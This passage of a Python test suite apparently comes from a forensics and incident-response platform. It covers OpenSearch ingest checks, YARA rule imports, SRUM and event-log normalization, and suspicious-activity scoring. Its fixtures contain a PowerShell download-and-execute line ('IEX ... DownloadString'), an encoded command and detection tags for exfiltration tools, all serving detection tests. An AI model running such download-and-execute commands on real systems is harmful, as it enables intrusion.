        def commit(self):
            return None

        def refresh(self, item):  # noqa: ANN001
            return None

    db = DummySession()
    _, created = create_detection_if_missing(
        db,
        case_id="case-1",
        evidence_id="ev-1",
        artifact_id="art-1",
        rule_id="rule-1",
        rule_set_id=None,
        engine="heuristic",
        source_engine="heuristic",
        rule_name="Suspicious command line",
        severity="high",
        confidence=None,
        event_id="event-1",
        target_path=None,
        message="test",
        raw={},
    )
    assert created is True
    assert len(db.added) == 1


def test_patch_system_settings_marks_restart(monkeypatch) -> None:
    class DummyDb:
        pass

    monkeypatch.setattr("app.api.routes_system.set_setting", lambda db, key, value: None)
    monkeypatch.setattr("app.api.routes_system.get_effective_settings", lambda db: {"OPENSEARCH_JAVA_HEAP": "4g", "INGEST_BATCH_SIZE": 2000})
    response = patch_system_settings({"settings": {"INGEST_BATCH_SIZE": 2000, "OPENSEARCH_JAVA_HEAP": "4g"}}, DummyDb())
    assert "INGEST_BATCH_SIZE" in response["runtime_applied"]
    assert "OPENSEARCH_JAVA_HEAP" in response["requires_restart"]


def test_system_status_shape(monkeypatch, tmp_path: Path) -> None:
    monkeypatch.setattr("app.api.routes_system.settings", SimpleNamespace(backend_data_dir=tmp_path, redis_url="redis://example"))
    monkeypatch.setattr("app.api.routes_system.psutil.cpu_percent", lambda interval=0.1: 10.0)
    monkeypatch.setattr("app.api.routes_system.psutil.cpu_count", lambda: 4)
    monkeypatch.setattr("app.api.routes_system.psutil.virtual_memory", lambda: SimpleNamespace(total=100, used=50, percent=50))
    monkeypatch.setattr("app.api.routes_system.psutil.disk_usage", lambda path: SimpleNamespace(total=100, used=10, percent=10))
    monkeypatch.setattr("app.api.routes_system.Redis.from_url", lambda url: object())
    monkeypatch.setattr("app.api.routes_system._queue_stats", lambda connection, name: {"queued": 0, "started": 0, "failed": 0, "finished": 0})
    monkeypatch.setattr("app.api.routes_system.Worker.all", lambda connection: [])
    monkeypatch.setattr("app.api.routes_system.get_effective_settings", lambda db: {
        "INGEST_BATCH_SIZE": 1000,
        "OPENSEARCH_BULK_DOCS": 1000,
        "OPENSEARCH_BULK_BYTES": 10485760,
        "MAX_PARALLEL_ARTIFACTS": 1,
        "MAX_PARALLEL_RULE_RUNS": 1,
        "OPENSEARCH_JAVA_HEAP": "2g",
        "BACKEND_UVICORN_WORKERS": 1,
    })
    monkeypatch.setattr("app.api.routes_system.get_opensearch_client", lambda: (_ for _ in ()).throw(RuntimeError("unavailable")))
    monkeypatch.setattr("app.api.routes_system.get_opensearch_ingest_preflight", lambda case_id=None: {"ingest_writable": False, "blocking_reasons": ["cluster_create_index_blocked"]})
    status = system_status(object())
    assert {"cpu", "memory", "disk", "queues", "opensearch", "settings", "workers"}.issubset(status.keys())


def test_assert_opensearch_ingest_ready_rejects_cluster_create_index_block(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(
        "app.core.opensearch.get_opensearch_ingest_preflight",
        lambda case_id=None: {
            "reachable": True,
            "cluster_status": "yellow",
            "cluster_create_index_blocked": True,
            "cluster_write_blocked": False,
            "target_index": "dfir-events-case-1",
            "target_index_exists": False,
            "target_index_write_blocked": False,
            "target_index_read_only_allow_delete": False,
            "bulk_indexing_permitted": False,
            "ingest_writable": False,
            "blocking_reasons": ["cluster_create_index_blocked", "missing_target_index_create_blocked"],
        },
    )
    with pytest.raises(OpenSearchIngestBlockedError, match="OpenSearch is not writable or cannot create indices"):
        assert_opensearch_ingest_ready("case-1")


def test_assert_opensearch_ingest_ready_rejects_existing_index_write_block(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(
        "app.core.opensearch.get_opensearch_ingest_preflight",
        lambda case_id=None: {
            "reachable": True,
            "cluster_status": "yellow",
            "cluster_create_index_blocked": False,
            "cluster_write_blocked": False,
            "target_index": "dfir-events-case-1",
            "target_index_exists": True,
            "target_index_write_blocked": True,
            "target_index_read_only_allow_delete": False,
            "bulk_indexing_permitted": False,
            "ingest_writable": False,
            "blocking_reasons": ["target_index_write_blocked"],
        },
    )
    with pytest.raises(OpenSearchIngestBlockedError, match="OpenSearch is not writable or cannot create indices"):
        assert_opensearch_ingest_ready("case-1")


def test_ensure_case_index_raises_typed_error_on_create_index_block(monkeypatch: pytest.MonkeyPatch) -> None:
    class _Indices:
        def exists(self, **kwargs):
            return False

        def create(self, **kwargs):
            raise RequestError(
                403,
                "index_create_block_exception",
                {"error": {"reason": "blocked by: [FORBIDDEN/10/cluster create-index blocked (api)];"}},
            )

    class _Client:
        indices = _Indices()

    monkeypatch.setattr("app.core.opensearch.get_opensearch_client", lambda timeout_seconds=None: _Client())
    monkeypatch.setattr(
        "app.core.opensearch.get_opensearch_ingest_preflight",
        lambda case_id=None: {
            "reachable": True,
            "cluster_status": "yellow",
            "cluster_create_index_blocked": True,
            "cluster_write_blocked": False,
            "target_index": "dfir-events-case-1",
            "target_index_exists": False,
            "target_index_write_blocked": False,
            "target_index_read_only_allow_delete": False,
            "bulk_indexing_permitted": False,
            "ingest_writable": False,
            "blocking_reasons": ["cluster_create_index_blocked"],
        },
    )
    with pytest.raises(OpenSearchIngestBlockedError):
        ensure_case_index("case-1")


def test_investigation_summary_no_index(monkeypatch) -> None:
    class DummyDb:
        def get(self, model, case_id):  # noqa: ANN001
            return object()

        def query(self, model):  # noqa: ANN001
            return SimpleNamespace(filter=lambda *args, **kwargs: SimpleNamespace(scalar=lambda: 0))

    monkeypatch.setattr("app.api.routes_cases.get_opensearch_client", lambda: object())
    monkeypatch.setattr("app.api.routes_cases.index_exists", lambda client, index: False)
    summary = get_investigation_summary("case-1", DummyDb())
    assert summary["total_events"] == 0
    assert summary["counts"]["detections"] == 0


def test_get_case_includes_detection_and_finding_counts() -> None:
    class DummyQuery:
        def __init__(self, value):
            self.value = value

        def filter(self, *args, **kwargs):  # noqa: ANN002, ANN003
            return self

        def scalar(self):
            return self.value

    class DummyCase:
        id = "case-1"
        name = "Test"
        description = None
        status = "open"
        timezone = "Europe/Madrid"

    class DummyDb:
        def get(self, model, case_id):  # noqa: ANN001
            return DummyCase()

        def query(self, model):  # noqa: ANN001
            if model.__name__ == "DetectionResult":
                return DummyQuery(3)
            return DummyQuery(2)

    case = get_case("case-1", DummyDb())
    assert case.detections_count == 3
    assert case.findings_count == 2


def test_yara_engine_availability_shape() -> None:
    assert isinstance(yara_available(), bool)


def test_detect_yara_rules_supports_private_and_global_forms() -> None:
    content = """
rule A { condition: true }
private rule B { condition: true }
global rule C { condition: true }
private global rule D { condition: true }
"""
    assert detect_yara_rules(content) == ["A", "B", "C", "D"]


def test_classify_yara_import_marks_multi_rule_file_as_pack() -> None:
    content = """/*
YARA-Forge Version: 0.40.0
Creation Date: 2026-05-03
Number of Rules: 3
*/
rule REVERSINGLABS_Win32_Downloader_Dlmarlboro { condition: true }
rule REVERSINGLABS_Linux_Backdoor_Chaosrat { condition: true }
rule REVERSINGLABS_Linux_Backdoor_Autocolor { condition: true }
"""
    classified = classify_yara_import(content, "yara-rules-full.yar")
    assert classified["is_rule_pack"] is True
    assert classified["rules_count"] == 3
    assert classified["metadata"]["number_of_rules"] == 3


def test_import_multi_rule_yara_creates_rule_set_not_fake_single_rule(monkeypatch) -> None:
    monkeypatch.setattr("app.api.routes_rules.log_activity", lambda *args, **kwargs: None)

    class DummyDb:
        def __init__(self):
            self.added = []

        def add(self, item):
            self.added.append(item)

        def commit(self):
            return None

        def refresh(self, item):  # noqa: ANN001
            return None

        def rollback(self):
            return None

    content = """/*
YARA-Forge Version: 0.40.0
Creation Date: 2026-05-03
Number of Rules: 3
*/
rule REVERSINGLABS_Win32_Downloader_Dlmarlboro { condition: true }
rule REVERSINGLABS_Linux_Backdoor_Chaosrat { condition: true }
rule REVERSINGLABS_Linux_Backdoor_Autocolor { condition: true }
"""
    rules, rule_sets, errors = _import_content(DummyDb(), filename="yara-rules-full.yar", content=content, engine="auto", import_mode="auto", case_id=None, namespace=None, enabled=True)
    assert errors == []
    assert len(rules) == 0
    assert len(rule_sets) == 1
    assert rule_sets[0].rules_count == 3


def test_import_single_rule_yara_creates_rule_only(monkeypatch) -> None:
    monkeypatch.setattr("app.api.routes_rules.log_activity", lambda *args, **kwargs: None)

    class DummyDb:
        def __init__(self):
            self.added = []

        def add(self, item):
            self.added.append(item)

        def commit(self):
            return None

        def refresh(self, item):  # noqa: ANN001
            return None

        def rollback(self):
            return None

    content = "rule OnlyOne { condition: true }"
    rules, rule_sets, errors = _import_content(DummyDb(), filename="single.yar", content=content, engine="auto", import_mode="auto", case_id=None, namespace=None, enabled=True)
    assert errors == []
    assert len(rules) == 1
    assert rules[0].name == "OnlyOne"
    assert rule_sets == []


def test_list_rule_sets_returns_imported_item() -> None:
    class DummyQuery:
        def __init__(self, items):
            self.items = items

        def filter(self, *args, **kwargs):  # noqa: ANN002, ANN003
            return self

        def count(self):
            return len(self.items)

        def order_by(self, *args, **kwargs):  # noqa: ANN002, ANN003
            return self

        def offset(self, value):  # noqa: ANN001
            return self

        def limit(self, value):  # noqa: ANN001
            return self

        def all(self):
            return self.items

    class DummyDb:
        def query(self, model):  # noqa: ANN001
            now = datetime.now(UTC).replace(tzinfo=None)
            return DummyQuery([SimpleNamespace(id="rs-1", case_id=None, name="yara-rules-full", engine="yara", namespace="yara_forge", description="Imported", source_filename="yara-rules-full.yar", content_path=None, content="rule A {}", rules_count=11658, enabled=True, severity=None, tags=["yara_forge"], metadata_json={"first_rules": ["A"]}, created_at=now, updated_at=now)])

    response = list_rule_sets(db=DummyDb())
    assert response.total == 1
    assert response.items[0].name == "yara-rules-full"


def test_rules_engine_status_reports_yara_rule_pack_support() -> None:
    status = rules_engine_status()
    assert status["yara"].supports_rule_packs is True


def test_yara_classifies_mftecmd_csv_as_parsed_output() -> None:
    target = classify_yara_target(Path("/tmp/parsed/MFTECmd_Output.csv"))
    assert target["candidate_type"] == "parsed_output"
    assert target["scan"] is False


def test_yara_classifies_exe_as_executable() -> None:
    target = classify_yara_target(Path("/tmp/sample.exe"))
    assert target["candidate_type"] == "executable"
    assert target["scan"] is True


def test_yara_classifies_ps1_as_script() -> None:
    target = classify_yara_target(Path("/tmp/evil.ps1"))
    assert target["candidate_type"] == "script"
    assert target["scan"] is True


def test_yara_classifies_zip_as_archive_and_skips_by_default() -> None:
    target = classify_yara_target(Path("/tmp/original/malware.zip"))
    assert target["candidate_type"] == "archive"
    assert target["scan"] is False


def test_semi_auto_analysis_generates_expected_sections(monkeypatch) -> None:
    events = [
        {
            "event_id": "evt-1",
            "evidence_id": "ev-1",
            "@timestamp": "2026-05-03T10:00:00+00:00",
            "host": {"name": "movistar-pc"},
            "user": {"name": "alex"},
            "event": {"type": "process_creation", "severity": "medium", "message": "Process created"},
            "process": {
                "name": "powershell.exe",
                "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "command_line": "powershell.exe -enc SQBFAFgA",
                "parent_name": "explorer.exe",
            },
            "windows": {"event_data": {"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://x')"}},
            "tags": ["powershell"],
            "suspicious_reasons": ["powershell_encoded", "download"],
        },
        {
            "event_id": "evt-2",
            "evidence_id": "ev-1",
            "@timestamp": "2026-05-03T10:01:00+00:00",
            "host": {"name": "movistar-pc"},
            "user": {"name": "alex"},
            "event": {"type": "logon_success", "severity": "info", "message": "Successful logon"},
            "windows": {"logon_type": "10", "event_data": {"WorkstationName": "HOSTA"}},
            "source": {"ip": "10.0.0.5"},
            "tags": ["rdp"],
            "suspicious_reasons": [],
        },
        {
            "event_id": "evt-3",
            "evidence_id": "ev-1",
            "@timestamp": "2026-05-03T10:02:00+00:00",
            "host": {"name": "movistar-pc"},
            "user": {"name": "SYSTEM"},
            "event": {"type": "service_created", "severity": "high", "message": "Service created"},
            "service": {"name": "MalSvc", "image_path": "C:\\ProgramData\\svc.exe", "account": "LocalSystem", "start_type": "Auto"},
            "tags": ["persistence"],
            "suspicious_reasons": ["programdata_path"],
        },
    ]
    monkeypatch.setattr("app.analysis.semi_auto.iter_case_events", lambda case_id: iter(events))
    result = build_case_semi_auto_analysis("case-1")
    assert result["summary"]["total_events"] == 3
    assert result["summary"]["powershell_executions"] == 1
    assert result["summary"]["rdp_sessions"] == 1
    assert result["summary"]["services_created"] == 1
    assert result["sections"]["powershell"][0]["activity_type"] == "powershell_execution"
    assert result["sections"]["rdp"][0]["activity_type"] == "rdp_logon"
    assert result["sections"]["services"][0]["activity_type"] == "service_created"


def test_semi_auto_analysis_applies_time_range(monkeypatch) -> None:
    captured: dict[str, object] = {}

    def fake_iter_case_events(case_id: str, query: dict | None = None, batch_size: int = 1000, max_docs: int = 100000):
        captured["case_id"] = case_id
        captured["query"] = query
        captured["batch_size"] = batch_size
        captured["max_docs"] = max_docs
        return iter([])

    monkeypatch.setattr("app.analysis.semi_auto.iter_case_events", fake_iter_case_events)
    result = build_case_semi_auto_analysis("case-2", time_from="2026-03-28T00:00:00Z", time_to="2026-03-29T00:00:00Z")

    assert captured["case_id"] == "case-2"
    assert captured["query"] == {"range": {"@timestamp": {"gte": "2026-03-28T00:00:00Z", "lte": "2026-03-29T00:00:00Z"}}}
    assert result["time_range"] == {"from": "2026-03-28T00:00:00Z", "to": "2026-03-29T00:00:00Z"}
    assert result["summary"]["total_events"] == 0


def test_semi_auto_analysis_includes_browser_downloads_and_execution(monkeypatch) -> None:
    events = [
        {
            "event_id": "evt-browser-1",
            "evidence_id": "ev-browser",
            "@timestamp": "2026-05-03T10:00:00+00:00",
            "host": {"name": "movistar-pc"},
            "user": {"name": "alex"},
            "event": {"type": "file_downloaded", "severity": "medium", "message": "Browser download: setup.exe from example.com"},
            "browser": {"name": "Chrome", "profile": "Default", "artifact_type": "download", "url": "https://downloads.example.com/setup.exe", "domain": "downloads.example.com"},
            "url": {"full": "https://downloads.example.com/setup.exe", "domain": "downloads.example.com"},
            "download": {"url": "https://downloads.example.com/setup.exe", "target_path": "C:\\Users\\alex\\Downloads\\setup.exe", "file_name": "setup.exe", "state": "Complete"},
            "file": {"path": "C:\\Users\\alex\\Downloads\\setup.exe", "name": "setup.exe", "extension": ".exe"},
            "tags": ["browser", "download", "executable_download"],
            "suspicious_reasons": ["Executable downloaded"],
        },
        {
            "event_id": "evt-mft-1",
            "evidence_id": "ev-mft",
            "@timestamp": "2026-05-03T10:02:00+00:00",
            "host": {"name": "movistar-pc"},
            "user": {"name": "alex"},
            "event": {"type": "file_created", "severity": "info", "message": "USN file created: C:\\Users\\alex\\Downloads\\setup.exe"},
            "file": {"path": "C:\\Users\\alex\\Downloads\\setup.exe", "name": "setup.exe", "extension": ".exe"},
            "artifact": {"type": "usn"},
            "filesystem": {"source": "usn"},
            "tags": ["filesystem", "usn"],
            "suspicious_reasons": [],
        },
        {
            "event_id": "evt-prefetch-1",
            "evidence_id": "ev-prefetch",
            "@timestamp": "2026-05-03T10:05:00+00:00",
            "host": {"name": "movistar-pc"},
            "user": {"name": "alex"},
            "event": {"type": "program_execution", "severity": "medium", "message": "Program execution"},
            "process": {"name": "setup.exe", "path": "C:\\Users\\alex\\Downloads\\setup.exe", "command_line": "C:\\Users\\alex\\Downloads\\setup.exe"},
            "execution": {"source": "prefetch", "run_count": 1, "last_run": "2026-05-03T10:05:00+00:00"},
            "tags": ["execution"],
            "suspicious_reasons": [],
        },
    ]
    monkeypatch.setattr("app.analysis.semi_auto.iter_case_events", lambda case_id, query=None: iter(events))
    result = build_case_semi_auto_analysis("case-1")
    assert result["sections"]["downloaded_files"]
    assert result["sections"]["downloaded_and_executed"]


def test_artifact_classification_srumecmd() -> None:
    result = classify_artifact(Path("SrumECmd_Output.csv"), ["Timestamp", "AppId", "BytesSent", "BytesReceived", "UserSid"])
    assert result["artifact_type"] == "srum"
    assert result["parser"] == "srum_csv"


def test_artifact_classification_srum_networkusage_headers() -> None:
    result = classify_artifact(Path("NetworkUsage.csv"), ["Timestamp", "Application", "BytesSent", "BytesReceived", "InterfaceProfile", "SID"])
    assert result["artifact_type"] == "srum"


def test_artifact_classification_eztools_console_log_is_not_parsed() -> None:
    result = classify_artifact(Path("SrumECmdConsoleLog.txt"))
    assert result["artifact_type"] == "tool_log"
    assert result["profile"] == "collection_metadata"
    assert result["parser"] == "not_implemented"
    assert "console log" in result["reason"].lower()


def test_artifact_classification_sbecmd_messages_is_not_parsed() -> None:
    result = classify_artifact(Path("!SBECmd_Messages.txt"))
    assert result["artifact_type"] == "tool_log"
    assert result["profile"] == "collection_metadata"
    assert result["parser"] == "not_implemented"


def test_evtxecmd_task_enabled_is_boolean() -> None:
    path = Path("EvtxECmd_Output.csv")
    row = {
        "Timestamp": "2026-05-12T12:00:00Z",
        "EventID": "4698",
        "Channel": "Security",
        "Provider": "Microsoft-Windows-Security-Auditing",
        "TaskName": "\\SuspiciousTask",
        "Enabled": "False",
        "Command": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    }
    document = normalize_row("case-1", "ev-1", "art-1", row, {"name": path.name, "artifact_type": "evtx", "parser": "zimmerman", "source_tool": "evtxecmd", "source_format": "csv"})
    assert document["task"]["enabled"] is False


def test_evtxecmd_csv_row_with_restkey_none_does_not_crash() -> None:
    path = Path("evtx_data.csv")
    row = {
        "Timestamp": "2026-05-12T12:00:00Z",
        "EventID": "4688",
        "Channel": "Security",
        "Provider": "Microsoft-Windows-Security-Auditing",
        "Computer": "hosta",
        "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
        None: ["unexpected", "overflow", "columns"],
    }
    document = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        row,
        {"name": path.name, "artifact_type": "evtx", "parser": "zimmerman", "source_tool": "evtxecmd", "source_format": "csv"},
    )
    assert document["host"]["name"] == "hosta"
    assert document["process"]["name"] == "cmd.exe"


def test_velociraptor_discovery_detects_srudb(tmp_path: Path) -> None:
    db_path = tmp_path / "uploads" / "auto" / "C%3A" / "Windows" / "System32" / "sru"
    db_path.mkdir(parents=True, exist_ok=True)
    (db_path / "SRUDB.dat").write_bytes(b"fake")
    discovery = discover_velociraptor_evidences(tmp_path)
    candidate = next(item for item in discovery.candidates if item.artifact_type == "srum_database")
    assert candidate.category == "network_activity"
    assert candidate.supported is False
    assert candidate.parser_status == "detected_not_implemented"
    assert candidate.reason == "Detected raw SRUM database. Use the scoped SRUM action to parse with SrumECmd."


def test_srumecmd_backend_detects_srudb_from_metadata() -> None:
    from app.ingest.raw_parsers.srumecmd_backend import find_srum_databases

    result = find_srum_databases(
        "case-1",
        "ev-1",
        {
            "velociraptor_discovery": {
                "candidates": [
                    {
                        "artifact_type": "srum_database",
                        "source_path": "uploads/auto/C:/Windows/System32/sru/SRUDB.dat",
                    }
                ]
            }
        },
    )
    assert result
    assert result[0]["source_path"].endswith("SRUDB.dat")


def test_velociraptor_discovery_marks_sru_chk_as_checkpoint(tmp_path: Path) -> None:
    db_path = tmp_path / "uploads" / "auto" / "C%3A" / "Windows" / "System32" / "sru"
    db_path.mkdir(parents=True, exist_ok=True)
    (db_path / "SRU.chk").write_bytes(b"fake")
    discovery = discover_velociraptor_evidences(tmp_path)
    candidate = next(item for item in discovery.candidates if item.artifact_type == "srum_checkpoint")
    assert candidate.category == "network_activity"
    assert candidate.supported is False
    assert candidate.parser_status == "auxiliary"
    assert candidate.reason == "Detected SRUM checkpoint file. Requires SRUDB.dat and a SRUM parser; not independently parseable."


def test_srum_network_usage_normalization_fixture() -> None:
    path = Path(__file__).parent / "fixtures" / "srum_network_usage_sample.csv"
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "srum", "name": path.name, "source_path": str(path), "parser": "zimmerman"})
    chrome_doc = next(doc for doc in docs if doc["process"]["name"] == "chrome.exe")
    assert chrome_doc["artifact"]["type"] == "srum"
    assert chrome_doc["event"]["type"] == "network_usage"
    assert chrome_doc["network"]["bytes_sent"] == 1024
    assert chrome_doc["network"]["bytes_received"] == 20480
    assert chrome_doc["network"]["direction"] == "bidirectional"
    assert chrome_doc["srum"]["artifact_type"] == "srum_network_usage"
    assert "chrome.exe" in chrome_doc["search_text"].lower()
    assert chrome_doc["raw"]["AppName"] == "chrome.exe"


def test_srum_application_resource_normalization_fixture() -> None:
    path = Path(__file__).parent / "fixtures" / "srum_application_resource_sample.csv"
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "srum", "name": path.name, "source_path": str(path), "parser": "zimmerman"})
    doc = next(item for item in docs if item["process"]["name"] == "Calculator.exe")
    assert doc["event"]["type"] == "app_resource_usage"
    assert doc["user"]["sid"] == "S-1-5-21-111-222-333-1001"
    assert doc["srum"]["duration"] == 120


def test_srum_sums_foreground_background_bytes() -> None:
    path = Path(__file__).parent / "fixtures" / "srum_network_usage_sample.csv"
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "srum", "name": path.name, "source_path": str(path), "parser": "zimmerman"})
    edge_doc = next(doc for doc in docs if doc["process"]["name"] == "msedge.exe")
    assert edge_doc["network"]["bytes_sent"] == 300
    assert edge_doc["network"]["bytes_received"] == 1200


def test_srum_suspicious_tags_are_applied() -> None:
    path = Path(__file__).parent / "fixtures" / "srum_network_usage_sample.csv"
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "srum", "name": path.name, "source_path": str(path), "parser": "zimmerman"})
    anydesk = next(doc for doc in docs if doc["process"]["name"] == "AnyDesk.exe")
    rclone = next(doc for doc in docs if doc["process"]["name"] == "rclone.exe")
    powershell = next(doc for doc in docs if doc["process"]["name"] == "powershell.exe")
    appdata = next(doc for doc in docs if doc["process"]["name"] == "updater.exe")
    assert "remote_access_tool" in anydesk["tags"]
    assert "file_transfer_tool" in rclone["tags"]
    assert "high_upload" in rclone["tags"]
    assert "possible_exfiltration" in rclone["tags"]
    assert "lolbin_network" in powershell["tags"]
    assert "suspicious_path" in appdata["tags"]


def test_srum_handles_missing_timestamp_and_bytes() -> None:
    path = Path(__file__).parent / "fixtures" / "srum_network_usage_sample.csv"
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "srum", "name": path.name, "source_path": str(path), "parser": "zimmerman"})
    missing = next(doc for doc in docs if doc["process"]["name"] == "mystery.exe")
    assert missing["@timestamp"] is None
    assert missing["network"]["bytes_sent"] is None
    assert missing["network"]["bytes_received"] is None
    assert "missing_timestamp" in (missing.get("data_quality") or [])
    assert "missing_bytes" in (missing.get("data_quality") or [])


def test_srum_powershell_high_outbound_risk() -> None:
    row = {
        "ArtifactType": "srum_network_usage",
        "Application": "powershell.exe",
        "AppId": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "BytesSent": "50000000",
        "BytesReceived": "100000",
        "EndTime": "2026-05-15T10:05:00Z",
        "UserSid": "S-1-5-21-111-222-333-1001",
        "SourceFile": "C:\\Windows\\System32\\sru\\SRUDB.dat",
    }
    doc = normalize_row("case-1", "ev-1", "art-1", row, {"artifact_type": "srum", "name": "srum_powershell_high_outbound.jsonl", "source_path": row["SourceFile"], "parser": "jsonl"})
    assert doc["event"]["type"] == "network_usage"
    assert doc["risk_score"] >= 70
    assert "SRUM network activity by scripting process" in (doc.get("suspicious_reasons") or [])
    assert "SRUM high outbound bytes" in (doc.get("suspicious_reasons") or [])
    assert "SRUM upload-heavy traffic" in (doc.get("suspicious_reasons") or [])
    assert doc["execution"]["is_execution_confirmed"] is False


def test_srum_certutil_lolbin_risk() -> None:
    row = {
        "ArtifactType": "srum_network_usage",
        "Application": "certutil.exe",
        "AppId": "C:\\Windows\\System32\\certutil.exe",
        "BytesSent": "1024",
        "BytesReceived": "2048",
        "EndTime": "2026-05-15T10:05:00Z",
    }
    doc = normalize_row("case-1", "ev-1", "art-1", row, {"artifact_type": "srum", "name": "srum_certutil.jsonl", "source_path": "C:\\Windows\\System32\\sru\\SRUDB.dat", "parser": "jsonl"})
    assert "SRUM network activity by LOLBin" in (doc.get("suspicious_reasons") or [])
    assert doc["risk_score"] >= 50


def test_srum_user_writable_application_risk() -> None:
    row = {
        "ArtifactType": "srum_network_usage",
        "Application": "updater.exe",
        "AppId": "C:\\Users\\dfir\\AppData\\Local\\Temp\\updater.exe",
        "BytesSent": "2000",
        "BytesReceived": "4000",
        "EndTime": "2026-05-15T10:05:00Z",
        "UserSid": "S-1-5-21-111-222-333-1001",
    }
    doc = normalize_row("case-1", "ev-1", "art-1", row, {"artifact_type": "srum", "name": "srum_updater.jsonl", "source_path": "C:\\Windows\\System32\\sru\\SRUDB.dat", "parser": "jsonl"})
    assert "SRUM network activity by user-writable application" in (doc.get("suspicious_reasons") or [])
    assert doc["risk_score"] >= 60
    assert doc["process"]["name"] == "updater.exe"


def test_srum_connectivity_record_normalization() -> None:
    row = {
        "ArtifactType": "srum_network_connectivity",
        "Table": "Network Connectivity",
        "NetworkProfile": "CorpWiFi",
        "ConnectedTime": "2026-05-15T10:00:00Z",
        "Duration": "3600",
        "SourceFile": "C:\\Windows\\System32\\sru\\SRUDB.dat",
    }
    doc = normalize_row("case-1", "ev-1", "art-1", row, {"artifact_type": "srum", "name": "srum_connectivity.jsonl", "source_path": row["SourceFile"], "parser": "jsonl"})
    assert doc["event"]["type"] == "network_connectivity_observed"
    assert doc["timestamp_precision"] == "srum_connected_time"
    assert doc["risk_score"] <= 10


def test_scheduled_task_without_forensic_timestamp_does_not_use_source_mtime_as_event_timestamp() -> None:
    doc = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "TaskName": "Windows Update Monitor",
            "TaskPath": "\\Windows Update Monitor",
            "SourceFile": "C:\\Windows\\System32\\Tasks\\Windows Update Monitor",
            "SourceFileMtime": "2026-05-27T10:30:00Z",
            "Author": "alex",
            "Description": "Suspicious task without forensic task timestamp",
            "Command": "C:\\Windows\\System32\\cmd.exe",
            "Arguments": "/c whoami",
        },
        {
            "artifact_type": "scheduled_task",
            "name": "Windows Update Monitor",
            "source_path": "C:\\Windows\\System32\\Tasks\\Windows Update Monitor",
            "parser": "scheduled_task_csv",
            "source_format": "csv",
            "source_tool": "native_scheduled_task",
        },
    )
    assert doc.get("@timestamp") is None
    assert doc["timestamp_status"] == "missing"
    assert doc["task"]["source_file_mtime"] == "2026-05-27T10:30:00+00:00"


def test_scheduled_task_xml_without_forensic_timestamp_keeps_timestamp_null() -> None:
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-1",
        Path(__file__).parent / "fixtures" / "scheduled_tasks" / "comhandler_task.xml",
        {
            "artifact_type": "scheduled_task",
            "name": "comhandler_task.xml",
            "source_path": str(Path(__file__).parent / "fixtures" / "scheduled_tasks" / "comhandler_task.xml"),
            "parser": "scheduled_task_xml",
            "source_format": "xml",
            "source_tool": "native_scheduled_task",
        },
    )
    doc = docs[0]
    assert doc.get("@timestamp") is None
    assert doc["timestamp_status"] == "missing"
    assert doc["timestamp_source"] is None
    assert doc["task"]["source_file_mtime"] is not None


def test_scheduled_task_xml_with_registration_date_uses_forensic_timestamp() -> None:
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-1",
        Path(__file__).parent / "fixtures" / "scheduled_tasks" / "benign_windows_update.xml",
        {
            "artifact_type": "scheduled_task",
            "name": "benign_windows_update.xml",
            "source_path": str(Path(__file__).parent / "fixtures" / "scheduled_tasks" / "benign_windows_update.xml"),
            "parser": "scheduled_task_xml",
            "source_format": "xml",
            "source_tool": "native_scheduled_task",
        },
    )
    doc = docs[0]
    assert doc["@timestamp"] == "2026-05-03T10:00:00+00:00"
    assert doc["timestamp_status"] == "valid"
    assert doc["timestamp_source"] == "registration_date"


def test_scheduled_task_future_timestamp_is_not_used_as_event_timestamp() -> None:
    doc = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "TaskName": "Impossible Future Task",
            "TaskPath": "\\Impossible Future Task",
            "Date": "2124-01-01T00:00:00Z",
            "SourceFile": "C:\\Windows\\System32\\Tasks\\Impossible Future Task",
            "Command": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "Arguments": "-NoProfile",
        },
        {
            "artifact_type": "scheduled_task",
            "name": "Impossible Future Task",
            "source_path": "C:\\Windows\\System32\\Tasks\\Impossible Future Task",
            "parser": "scheduled_task_csv",
            "source_format": "csv",
            "source_tool": "native_scheduled_task",
        },
    )
    assert doc.get("@timestamp") is None
    assert doc["raw_timestamp"] == "2124-01-01T00:00:00+00:00"
    assert doc["timestamp_status"] == "suspicious"
    assert doc["timestamp_warning"] == "future_out_of_range"
    assert doc["task"]["raw_timestamp"] == "2124-01-01T00:00:00+00:00"


def test_parallel_evidence_ref_prefers_user_provided_host_without_overwriting_detected_host() -> None:
    evidence = SimpleNamespace(
        id="evidence-1",
        case_id="case-1",
        detected_host="detected-host",
        detected_user="alice",
        metadata_json={"provided_host": "MANUAL-HOSTA", "latest_ingest_run_id": "ingest-1"},
    )
    result = _parallel_evidence_ref(evidence)
    assert result["detected_host"] == "MANUAL-HOSTA"
    assert result["provided_host"] == "MANUAL-HOSTA"


def test_srum_zero_bytes_sets_data_quality() -> None:
    row = {
        "ArtifactType": "srum_network_usage",
        "Application": "chrome.exe",
        "BytesSent": "0",
        "BytesReceived": "0",
        "EndTime": "2026-05-15T10:05:00Z",
    }
    doc = normalize_row("case-1", "ev-1", "art-1", row, {"artifact_type": "srum", "name": "srum_zero.jsonl", "source_path": "C:\\Windows\\System32\\sru\\SRUDB.dat", "parser": "jsonl"})
    assert "srum_zero_bytes" in (doc.get("data_quality") or [])
    assert doc["risk_score"] <= 10


def test_srum_host_not_inferred_from_srudb_filename() -> None:
    row = {
        "ArtifactType": "srum_network_usage",
        "Application": "chrome.exe",
        "BytesSent": "10",
        "BytesReceived": "20",
        "EndTime": "2026-05-15T10:05:00Z",
